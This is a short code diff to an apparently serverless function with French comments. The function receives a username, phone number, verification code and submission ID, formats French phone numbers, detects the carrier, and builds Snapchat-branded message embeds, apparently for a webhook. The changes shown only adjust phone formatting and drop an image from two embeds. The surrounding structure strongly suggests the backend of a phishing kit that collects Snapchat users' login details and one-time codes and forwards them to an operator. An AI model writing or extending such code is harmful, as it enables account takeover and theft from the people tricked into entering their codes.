@@ -77,9 +77,10 @@ serve(async (req) => {
 
     const { username, phone, code, step, submissionId } = await req.json();
 
-    // Formater le numéro de téléphone avec espaces
+    // Formater le numéro de téléphone avec drapeau français et +33
     const formatPhone = (p: string) => {
-      return p.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
+      const formatted = p.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
+      return `🇫🇷 +33 ${formatted.substring(1)}`; // Remplace le 0 par +33
     };
 
     // Détecter l'opérateur
@@ -132,9 +133,6 @@ serve(async (req) => {
         color: 0xFFA500,
         thumbnail: {
           url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
-        },
-        image: {
-          url: "https://i.imgur.com/AfFp7pu.png"
         },
         fields: [
           {
@@ -222,9 +220,6 @@ serve(async (req) => {
         color: 0xFFA500,
         thumbnail: {
           url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
-        },
-        image: {
-          url: "https://i.imgur.com/AfFp7pu.png"
         },
         fields: [
           {
